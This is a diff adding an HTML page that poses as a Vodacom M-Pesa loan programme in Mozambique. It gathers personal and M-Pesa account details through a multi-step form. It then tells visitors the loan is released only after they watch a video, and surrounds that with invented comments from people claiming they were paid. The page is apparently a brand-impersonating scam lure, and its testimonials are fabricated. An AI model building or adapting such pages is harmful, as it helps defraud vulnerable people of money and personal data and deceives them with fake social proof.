@@ -184,3 +184,445 @@
                         <select id="select-fonte" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-white">
                             <option value="Emprego">Emprego</option>
                             <option value="Negócio próprio">Negócio próprio</option>
+                            <option value="Trabalho informal">Trabalho informal</option>
+                            <option value="Agricultura">Agricultura</option>
+                            <option value="Trabalho por conta própria">Trabalho por conta própria</option>
+                            <option value="Outra">Outra</option>
+                        </select>
+                    </div>
+                </div>
+                <button type="button" id="btn-step5" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm cursor-pointer">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- STEP 6: Últimos dados -->
+            <div id="step-6" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Últimos dados</h2>
+                <p class="text-xs text-gray-500 mb-4">Informações finais para liberação do saldo.</p>
+                
+                <div class="space-y-4 mb-6">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Quanto consegue ganhar aproximadamente por mês?</label>
+                        <select id="select-rendimento" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
+                            <option value="Menos de MT 5.000">Menos de MT 5.000</option>
+                            <option value="MT 5.000 – 10.000">MT 5.000 – 10.000</option>
+                            <option value="MT 10.001 – 20.000">MT 10.001 – 20.000</option>
+                            <option value="Mais de MT 20.000">Mais de MT 20.000</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é o seu estado civil?</label>
+                        <select id="select-estadocivil" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
+                            <option value="Solteiro(a)">Solteiro(a)</option>
+                            <option value="Casado(a)">Casado(a)</option>
+                            <option value="União de facto">União de facto</option>
+                            <option value="Divorciado(a)">Divorciado(a)</option>
+                            <option value="Viúvo(a)">Viúvo(a)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Número M-Pesa a receber o empréstimo</label>
+                        <input type="tel" id="input-numero" placeholder="Ex: 84XXXXXXX / 85XXXXXXX" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Nome do seu M-Pesa</label>
+                        <input type="text" id="input-nomempesa" placeholder="Nome titular da conta M-Pesa" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
+                    </div>
+                </div>
+                <button type="button" id="btn-step6" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm cursor-pointer">
+                    Ver resumo
+                </button>
+            </div>
+
+            <!-- STEP 7: Resumo -->
+            <div id="step-7" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Resumo</h2>
+                <p class="text-xs text-gray-500 mb-4">Confirme os seus dados antes de prosseguir.</p>
+                
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 text-xs space-y-2 mb-6 max-h-60 overflow-y-auto">
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Nome:</span> <span id="res-nome" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Localidade:</span> <span id="res-localidade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Idade:</span> <span id="res-idade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Valor:</span> <span id="res-valor" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Quando pretende:</span> <span id="res-prazo" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Finalidade:</span> <span id="res-finalidade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Fonte de rendimento:</span> <span id="res-fonte" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Rendimento mensal:</span> <span id="res-rendimento" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Estado civil:</span> <span id="res-estadocivil" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Número M-Pesa:</span> <span id="res-numero" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Nome M-Pesa:</span> <span id="res-nomempesa" class="font-medium text-gray-800">--</span></div>
+                </div>
+
+                <button type="button" id="btn-step7" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- STEP 8: VSL (Video Sales Letter) Page -->
+            <div id="step-8" class="step-content hidden p-6">
+                <h2 class="text-xl font-bold text-gray-900 mb-2 text-center">Assista ao vídeo para liberar o seu Empréstimo M-Pesa</h2>
+                <p class="text-xs text-gray-600 mb-4 text-center">Veja o vídeo abaixo até ao fim para receber a solicitação de empréstimo diretamente no seu M-Pesa.</p>
+
+                <!-- Video Box Simulation -->
+                <div class="relative bg-black rounded-xl overflow-hidden aspect-video shadow-md mb-4 flex items-center justify-center">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent flex flex-col justify-end p-4 text-white">
+                        <span class="text-xs font-semibold bg-vodared px-2 py-0.5 rounded w-max mb-1">Vídeo Oficial</span>
+                        <p class="text-xs opacity-90">Instruções de Desbloqueio M-Pesa</p>
+                    </div>
+                    <div class="w-12 h-12 bg-vodared rounded-full flex items-center justify-center shadow-lg text-white font-bold text-lg cursor-pointer live-pulse">
+                        ▶
+                    </div>
+                </div>
+
+                <!-- Sound Alert Box -->
+                <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
+                    <p class="text-xs font-medium text-red-800 mb-2">Certifique-se de que o som está ligado</p>
+                    <button type="button" onclick="alert('Som ativado com sucesso!')" class="bg-vodared hover:bg-vodadark text-white text-xs font-bold py-2 px-4 rounded-lg shadow transition cursor-pointer">
+                        Ligar o som do vídeo
+                    </button>
+                </div>
+
+                <p class="text-[11px] text-gray-400 text-center mb-6">Veja o vídeo até ao fim para desbloquear o botão.</p>
+
+                <!-- Comments Section -->
+                <div class="border-t border-gray-100 pt-4">
+                    <h3 class="font-bold text-gray-800 text-sm mb-1">Comentários</h3>
+                    <p class="text-xs text-gray-500 mb-3">o que outros estão a dizer</p>
+                    
+                    <div class="flex items-center justify-between text-xs text-gray-600 mb-4 pb-2 border-b border-gray-100">
+                        <span class="font-semibold text-gray-800">5 Comentários</span>
+                        <span class="text-gray-400 cursor-pointer">Mais relevantes ▾</span>
+                    </div>
+
+                    <!-- Comment List -->
+                    <div class="space-y-4 text-xs">
+                        <!-- Comment 1 -->
+                        <div class="space-y-1">
+                            <div class="flex items-start space-x-2">
+                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">CM</div>
+                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
+                                    <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
+                                    <p class="text-gray-700">Mano, recebi mesmo os 5,000.00 MT no M-Pesa 🙏🙏 nem acreditei quando vi a notificação. Obrigado Vodacom!</p>
+                                </div>
+                            </div>
+                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
+                                <span class="cursor-pointer text-vodared">Gostar</span>
+                                <span class="cursor-pointer">Responder</span>
+                                <span class="text-gray-400">12 min · 342</span>
+                            </div>
+
+                            <!-- Reply 1.1 -->
+                            <div class="pl-8 pt-2 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">SM</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
+                                        <p class="text-gray-700">Sério mesmo?? to a tentar agora 😱</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">8 min</span>
+                                </div>
+                            </div>
+
+                            <!-- Reply 1.2 -->
+                            <div class="pl-8 pt-1 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">CM</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
+                                        <p class="text-gray-700">Sim mana, só seguir o video todo até ao fim que cai 👍🏾</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">5 min</span>
+                                </div>
+                            </div>
+
+                            <!-- Reply 1.3 -->
+                            <div class="pl-8 pt-1 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">SM</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
+                                        <p class="text-gray-700">Caiu agora mesmo!! obg 🥺❤️</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">2 min</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Comment 2 -->
+                        <div class="space-y-1">
+                            <div class="flex items-start space-x-2">
+                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">SM</div>
+                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
+                                    <span class="font-bold text-gray-900 block mb-0.5">Sónia Macuácua</span>
+                                    <p class="text-gray-700">Já é a 2a vez q participo nestes programas da Vodacom... sempre pagam certinho. Moçambique a evoluir 🇲🇿💚</p>
+                                </div>
+                            </div>
+                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
+                                <span class="cursor-pointer text-vodared">Gostar</span>
+                                <span class="cursor-pointer">Responder</span>
+                                <span class="text-gray-400">27 min · 189</span>
+                            </div>
+                        </div>
+
+                        <!-- Comment 3 -->
+                        <div class="space-y-1">
+                            <div class="flex items-start space-x-2">
+                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">HC</div>
+                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
+                                    <span class="font-bold text-gray-900 block mb-0.5">Hélder Cossa</span>
+                                    <p class="text-gray-700">pensei q era falso mas caiu mesmo o saldo no meu m-pesa 😳 valeu a pena ver o video todo, recomendo ✅</p>
+                                </div>
+                            </div>
+                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
+                                <span class="cursor-pointer text-vodared">Gostar</span>
+                                <span class="cursor-pointer">Responder</span>
+                                <span class="text-gray-400">41 min · 127</span>
+                            </div>
+                        </div>
+
+                        <!-- Comment 4 -->
+                        <div class="space-y-1">
+                            <div class="flex items-start space-x-2">
+                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">LM</div>
+                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
+                                    <span class="font-bold text-gray-900 block mb-0.5">Lúcia Mondlane</span>
+                                    <p class="text-gray-700">Recebi tudo direitinho, vou usar pra pagar a escola dos miudos 😭🙌🏾 que Deus abençoe quem criou esse programa</p>
+                                </div>
+                            </div>
+                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
+                                <span class="cursor-pointer text-vodared">Gostar</span>
+                                <span class="cursor-pointer">Responder</span>
+                                <span class="text-gray-400">2 h · 411</span>
+                            </div>
+
+                            <!-- Reply 4.1 -->
+                            <div class="pl-8 pt-2 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">HC</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Hélder Cossa</span>
+                                        <p class="text-gray-700">amen mana 🙏🏾</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">1 h</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Comment 5 -->
+                        <div class="space-y-1">
+                            <div class="flex items-start space-x-2">
+                                <div class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-xs flex-shrink-0">FC</div>
+                                <div class="bg-gray-100 p-3 rounded-xl rounded-tl-none flex-grow">
+                                    <span class="font-bold text-gray-900 block mb-0.5">Felizarda Chissano</span>
+                                    <p class="text-gray-700">alguém me ajuda pf, fiz tudo mas ainda nao recebi 😢</p>
+                                </div>
+                            </div>
+                            <div class="pl-10 flex space-x-4 text-[11px] text-gray-500 font-medium">
+                                <span class="cursor-pointer text-vodared">Gostar</span>
+                                <span class="cursor-pointer">Responder</span>
+                                <span class="text-gray-400">3 h · 12</span>
+                            </div>
+
+                            <!-- Reply 5.1 -->
+                            <div class="pl-8 pt-2 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">CM</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Carlos Mabunda</span>
+                                        <p class="text-gray-700">Tem que ver o video até ao final mana, eu tbm achei q não ia funcionar</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">2 h</span>
+                                </div>
+                            </div>
+
+                            <!-- Reply 5.2 -->
+                            <div class="pl-8 pt-1 space-y-1">
+                                <div class="flex items-start space-x-2">
+                                    <div class="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center font-bold text-gray-700 text-[10px] flex-shrink-0">FC</div>
+                                    <div class="bg-gray-100 p-2.5 rounded-xl rounded-tl-none flex-grow">
+                                        <span class="font-bold text-gray-900 block mb-0.5">Felizarda Chissano</span>
+                                        <p class="text-gray-700">ahh ok deixa eu tentar de novo, obg 🙏</p>
+                                    </div>
+                                </div>
+                                <div class="pl-9 flex space-x-4 text-[10px] text-gray-500 font-medium">
+                                    <span class="cursor-pointer text-vodared">Gostar</span>
+                                    <span class="cursor-pointer">Responder</span>
+                                    <span class="text-gray-400">2 h</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="text-center py-4 text-[11px] text-gray-500 border-t border-gray-100">
+        © 2026 Vodacom · Programa Empréstimos M-Pesa · Moçambique
+    </footer>
+
+    <!-- JavaScript Logic -->
+    <script>
+        let currentStep = 0;
+        const totalSteps = 7;
+        const formData = {};
+
+        function updateView() {
+            for (let i = 0; i <= 8; i++) {
+                const el = document.getElementById(`step-${i}`);
+                if (el) el.classList.add('hidden');
+            }
+
+            const currentEl = document.getElementById(`step-${currentStep}`);
+            if (currentEl) currentEl.classList.remove('hidden');
+
+            const progHeader = document.getElementById('progress-header');
+            if (currentStep === 0 || currentStep === 8) {
+                progHeader.classList.add('hidden');
+            } else {
+                progHeader.classList.remove('hidden');
+                const percent = Math.round((currentStep / totalSteps) * 100);
+                document.getElementById('step-counter').innerText = `Etapa ${currentStep} de ${totalSteps}`;
+                document.getElementById('progress-bar').style.width = `${percent}%`;
+            }
+        }
+
+        function nextStep() {
+            if (currentStep < 8) {
+                currentStep++;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+
+        function prevStep() {
+            if (currentStep > 1) {
+                currentStep--;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else if (currentStep === 1) {
+                currentStep = 0;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+
+        function setValor(val) {
+            document.getElementById('input-valor').value = val;
+        }
+
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('btn-comecar').addEventListener('click', nextStep);
+            document.getElementById('btn-voltar').addEventListener('click', prevStep);
+
+            document.getElementById('btn-step1').addEventListener('click', () => {
+                const val = document.getElementById('input-nome').value.trim();
+                if (!val) {
+                    alert('Por favor, insira o seu nome completo.');
+                    return;
+                }
+                formData.nome = val;
+                nextStep();
+            });
+
+            document.getElementById('btn-step2').addEventListener('click', () => {
+                const loc = document.getElementById('input-localidade').value.trim();
+                const idade = document.getElementById('input-idade').value.trim();
+                if (!loc || !idade) {
+                    alert('Por favor, preencha a localidade e a idade.');
+                    return;
+                }
+                formData.localidade = loc;
+                formData.idade = idade;
+                nextStep();
+            });
+
+            document.getElementById('btn-step3').addEventListener('click', () => {
+                const valor = document.getElementById('input-valor').value.trim();
+                if (!valor || Number(valor) < 70 || Number(valor) > 5000) {
+                    alert('Por favor, insira um valor válido entre MT 70 e MT 5.000.');
+                    return;
+                }
+                formData.valor = `MT ${valor}`;
+                nextStep();
+            });
+
+            document.getElementById('btn-step4').addEventListener('click', nextStep);
+            document.getElementById('btn-step5').addEventListener('click', nextStep);
+
+            document.getElementById('btn-step6').addEventListener('click', () => {
+                const rendimento = document.getElementById('select-rendimento').value;
+                const estadocivil = document.getElementById('select-estadocivil').value;
+                const numero = document.getElementById('input-numero').value.trim();
+                const nomempesa = document.getElementById('input-nomempesa').value.trim();
+
+                if (!numero || !nomempesa) {
+                    alert('Por favor, preencha o número M-Pesa e o nome do titular.');
+                    return;
+                }
+
+                formData.prazo = document.querySelector('input[name="prazo"]:checked').value;
+                formData.finalidade = document.getElementById('select-finalidade').value;
+                formData.fonte = document.getElementById('select-fonte').value;
+                formData.rendimento = rendimento;
+                formData.estadocivil = estadocivil;
+                formData.numero = numero;
+                formData.nomempesa = nomempesa;
+
+                document.getElementById('res-nome').innerText = formData.nome || '--';
+                document.getElementById('res-localidade').innerText = formData.localidade || '--';
+                document.getElementById('res-idade').innerText = formData.idade || '--';
+                document.getElementById('res-valor').innerText = formData.valor || '--';
+                document.getElementById('res-prazo').innerText = formData.prazo || '--';
+                document.getElementById('res-finalidade').innerText = formData.finalidade || '--';
+                document.getElementById('res-fonte').innerText = formData.fonte || '--';
+                document.getElementById('res-rendimento').innerText = formData.rendimento || '--';
+                document.getElementById('res-estadocivil').innerText = formData.estadocivil || '--';
+                document.getElementById('res-numero').innerText = formData.numero || '--';
+                document.getElementById('res-nomempesa').innerText = formData.nomempesa || '--';
+
+                currentStep = 7;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            document.getElementById('btn-step7').addEventListener('click', () => {
+                currentStep = 8;
+                updateView();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            updateView();
+        });
+    </script>
+</body>
+</html>
